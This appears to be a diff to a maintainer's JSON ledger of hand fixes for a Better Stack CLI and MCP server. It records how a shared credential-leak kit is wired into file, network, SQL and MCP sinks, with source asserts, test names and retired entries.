+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces this connector's own credential layer. internal/credwire/declarations.go holds the one Declarations literal; each main starts with credkit.Start and ends with credkit.Exit, and every early exit of the MCP main returns through it; the API client (client.OutboundGuard, under the origin pin), feedback, deliver and probe clients go through credkit.Transport; every file write outside the 0600 credential store and config goes through the kit (response and platform cache, export, deliver, feedback, journal, teach logs, run profiles, client profiles, the legacy-store claim marker, the rate-limit stamp); the MCP stdio and HTTP servers pass credkit.MCPIn, MCPOut, MCPHTTP and MCPTools; the MCP mirror runs the CLI with credkit.RunCommand; stdout is asked about through credkit.Terminal. The store and config rewrites go outside the kit (cliutil.AtomicWriteCredentialFile) as declared credential sources. A config or credential file is held with credkit.HoldBody and credkit.HoldURL every time it is read, a token read from a pipe is held as stdin, a dry-run preview's body is held (cliutil.HoldBody) before it prints, a built auth header and a resolved client-profile value are held where they enter, and the MCP server's --tls-key file is held at startup. A run profile treats a flag the one secret-name rule names as a credential flag.",
+   "why": "One contract, one matcher and one set of sinks replace the connector-only copies, and a matcher fix reaches this connector by vendoring. It closes the three open print-review P1 inputs (a monitor's basic-auth user under AUTHUSER, a 2-character password inside a hex-escaped name, a password inside a headerless deflate stream nested in a member) and the open review classes: a malformed config's credential in a startup flag error, doctor's credentials verdict (no name-based redaction), the env-schema gate (no EnvOverride holder over every variable), and the MCP HTTP no-token refusal printed before os.Exit (credkit.Exit drains it). Tests: internal/credwire/leak_test.go, on the built binaries, seen failing on the pre-kit HEAD or with credkit.Start removed. Retires secret-echo-decoded-funnel, output-chokepoint, file-sinks-withheld, mcp-protocol-messages-withheld, network-sinks-withheld, startup-output-held-first, mcp-held-arguments-refused, undecoded-encodings-every-alignment, held-forms-in-every-encoding, response-credentials-held, every-text-encoding-withheld, outbound-split-parts-refused, auth-carrier-names-and-shapes-held, secure-container-is-credential, r1-holder-reads-every-part, r1-mixed-byte-escapes-decoded, r1-split-across-deliveries-withheld, held-value-case-folded, output-units-reassembled, preclose-holder-numbers-and-cookies, preclose-escape-fixpoint, preclose-split-across-processes-and-protocol, refuse-held-uses-connector-chokepoint, output-derived-and-scheme-forms-matched-whole, g304-paths-cleaned-not-annotated, r1-short-value-encodings-withheld, r1-file-history-is-the-whole-file, r2-short-value-nested-encodings, r1-credential-split-across-deliveries, r1-decoder-bound-read-as-no-echo, r1-persistence-gate-narrower-than-chokepoint, startup-error-lost, r1-short-held-value-inside-other-text and r1-secret-in-headerless-compressed-stream: replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements tools/maintainer/fleet_handfixes.json backs). Retires r1-unreadable-history-read-as-empty and r1-check-then-append-not-serialized too: a credential split across two runs of the program is contract section 6 item 5 (advisory), and the history check and file lock (betterstack_filelock.go) that served them are gone; the kit reconciles a file's history on open. The kit holds every contract section 1 source at startup and on arrival and withholds at every sink as one stream, so the connector's own holder, decoded funnel, output chokepoint, file and network writers, SQL withhold driver, argv refusal and exit shim are gone, with their tests.",
+   "spec_encode_followup": "Press-side: generate the kit wiring and the Declarations literal.",
+   "asserts": [
+    {
+     "file": "cli/cmd/betterstack-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools),",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "flag.CommandLine.Init(os.Args[0], flag.ContinueOnError)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "not_contains": "exitMCP("
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Files:            credentialFiles,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.HoldTLSKeyFile(keyFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func HoldConfigFile(data []byte) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.HoldConfigFile(data)",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := cliutil.AtomicWriteCredentialFile(c.Path, data, 0o600, 0o700); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "HoldConfigFile(data)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "if err := AtomicWriteCredentialFile(path, data, 0o600, 0o700); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(path string, data []byte, fileMode, dirMode os.FileMode) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "guardTransport(tr)",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.Hold(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cliutil.Hold(\"stdin\", token)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.WriteFile(tempName, []byte(scopeHash+\"\\n\"), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "outKit = credkit.NewWriter(f, credkit.SinkFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.WriteFile(tmp, body, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: credkit.Transport(nil),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "client := &http.Client{Timeout: 15 * time.Second, Transport: credkit.Transport(nil)}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if err := credkit.WriteFile(tmp, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if cliutil.SecretFieldName(name) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "return credkit.WriteFile(path, []byte(strings.Join(kept, \"\\n\")+\"\\n\"), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "f, err := credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "_ = credkit.WriteFile(s.path(key), []byte(value), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "if err := credkit.WriteFile(tmpName, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "cliutil.Hold(\"minted:client-profile\", string(value))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/ratelimit.go",
+     "contains": "_ = credkit.WriteFile(path, []byte(strconv.FormatInt(time.Now().UnixNano(), 10)), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "next = credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "inner := next",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "not_contains": "responseHoldTripper"
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestP1JournalHalvesFromTwoProcesses(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestExportSplitAcrossPagesNeverLandsWhole(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMalformedConfigNeverPrintsAtStartup(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMCPHTTPWithoutTokenSaysWhy(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestChildGetsTheKey(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestAgentContextPrints(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestEveryCredentialFileKeyIsClassified(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestP1PairIdentityInAnyCaseNeverPrints(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestP1ShortValueInsideOtherTextNeverPrints(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestP1NestedHeaderlessDeflateNeverPrints(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMonitorCredentialsNeverPrint(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.HoldBody(body)",
+     "code_only": true
+    }
    ]
+  },
+  {
+   "id": "credkit-sqlite-every-handle",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "Every SQLite handle goes through credkit.SQLDriver: internal/credsql registers the one driver and every sql.Open in store.go and platform/migration.go names it, the read-only opener included. The MCP sql value cap moved from sqlite.Limit on a held connection to a DSN parameter credsql applies as each connection opens. The read-only opener runs select 1 because the kit's connection does not forward Ping.",
+   "why": "A statement's text and bound values are a sink of their own, reads included. The kit checks each statement once against its matcher, so the internal/store suite no longer pays the old per-statement decode of the retired withhold driver.",
+   "spec_encode_followup": "Press-side: generate store, migration and MCP sql opens against one kit-wrapped driver name, and express the MCP sql value cap as a connection-open setting.",
+   "asserts": [
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql_test.go",
+     "contains": "func TestLengthLimitAppliesToEveryConnection(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if _, err := db.ExecContext(ctx, \"select 1\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver,",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "WithholdingSQLiteDriver"
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit("
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools_test.go",
+     "contains": "func TestMCPSQLOversizedValueIsRefused(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-mcphttp-outermost",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credkit.MCPHTTP writes every response the MCP HTTP server serves, refusals included. requireBearerAuthWithLimits runs a preflight that writes nothing, then credkit.MCPHTTP around a gate that answers the Origin, bearer and body-limit verdicts.",
+   "why": "With the kit wrapping only the inner handler, a refusal answers outside it.",
+   "spec_encode_followup": "Press-side: generate the MCP HTTP auth wrapper so its refusals are written by the inner, kit-wrapped handler and only a write-free preflight runs before credkit.MCPHTTP.",
+   "asserts": [
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "kit.ServeHTTP(w, r)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMCPHTTPRefusalsPassTheKit(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "stdin-body-declared",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "--stdin is a declared StdinFlag, so the kit holds a body whole and line by line before anything prints. cliutil.CompactStdinBody puts a JSON body on one line first, because a line of { alone collides with public text and refuses the start. feedback --stdin refuses instead of reporting a record the kit would withhold.",
+   "why": "A monitor body (monitors create or update --stdin) carries auth_password and request_headers, and a held body is the kit's to judge. The cost: a --dry-run preview of a --stdin body, and a vendor answer repeating part of it, are withheld whole, and the write still happens.",
+   "spec_encode_followup": "Press-side: generate StdinFlags and the compaction with the kit wiring.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "StdinFlags:       []string{\"--stdin\"},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.CompactStdinBody(args)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func CompactStdinBody(args []string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "feedback --stdin cannot record a note",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestStdinBodyIsHeldBeforeAPreview(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "used-config-decides-origin",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "credentialFiles returns the config the program really uses first, because the kit takes the base URL and every allowed origin from the first file naming one: an explicit --config or BETTERSTACK_CONFIG wins, the last --home decides the default paths, and every other file any flag could mean is only held. The credential stores and run profile stores are only held too: config.Load takes no base URL from a store. Startup reads --config and --home by every occurrence; the root pre-run refuses a run whose parsed values differ (another flag swallowed one), so a file the run does not use never names the allowed origin. betterstack-mcp, which has no such flags, refuses to start when startup read one.",
+   "why": "A discovered default's or a store's base_url must not become an allowed origin for a credential from another file.",
+   "spec_encode_followup": "Press-side: generate the file discovery in the wiring file.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func credentialFiles(args []string) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "holdOnly(runFiles(cfg))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cliutil.StartupConfigFlag, cliutil.StartupHomeFlag = explicit, \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "func CheckStartupFlags(config, home string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "cliutil.CheckStartupFlags(flags.configPath, flags.homePath)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/betterstack-mcp/main.go",
+     "contains": "if cliutil.StartupConfigFlag != \"\" || cliutil.StartupHomeFlag != \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestUsedConfigDecidesTheAllowedOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestStartupFlagTheParserDidNotUseIsRefused(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMCPRefusesAConfigFlagItDoesNotHave(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "report-refreshes-every-resource-it-reads",
+   "status": "active",
+   "summary": "Every report's readCommandResources entry (auto_refresh.go) names every resource its loaders read, so automatic refresh renews each one past the freshness window; statuspage-audit now refreshes heartbeats, which it reads for a page's heartbeat entries",
+   "why": "Codex r1 [P1] class stale-dependent-resource (betterstack 0.1.8, credential kit branch): statuspage-audit's entry listed status-pages, monitors and incidents, but its loaders also read heartbeats, and requireFinishedSync accepts any finished sync however old. A heartbeat paused in Better Stack after the last sync stayed unpaused in the store, and `statuspage-audit --json` returned no findings with live_check ok. The press generates readCommandResources from spec.Cache.Commands, and no spec ships in this repo, so the entry is a hand edit to a generated file. TestStatuspageAuditRefreshesTheHeartbeatsItReads was seen failing first on the round-1 code. TestEveryReportRefreshesEveryResourceItReads is the class guard: it finds every command whose body reaches requireFinishedSync from the package source, runs each against a synced store with the requireFinishedSyncSeen hook (betterstack_snapshot.go), and fails when a report reads a resource its entry does not refresh or has no entry at all; seen failing on the old statuspage-audit list, on a removed heartbeat-risk entry and on group-health without monitor-groups.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auto_refresh.go",
+     "contains": "\t\"betterstack-cli statuspage-audit\": {\n\t\t\"status-pages\",\n\t\t\"monitors\",\n\t\t\"incidents\",\n\t\t\"heartbeats\",\n\t},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_snapshot.go",
+     "contains": "\tif requireFinishedSyncSeen != nil {\n\t\trequireFinishedSyncSeen(resourceType)\n\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_refresh_coverage_test.go",
+     "contains": "func TestEveryReportRefreshesEveryResourceItReads(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_refresh_coverage_test.go",
+     "contains": "func TestStatuspageAuditRefreshesTheHeartbeatsItReads(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "stale-dependent-resource"
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
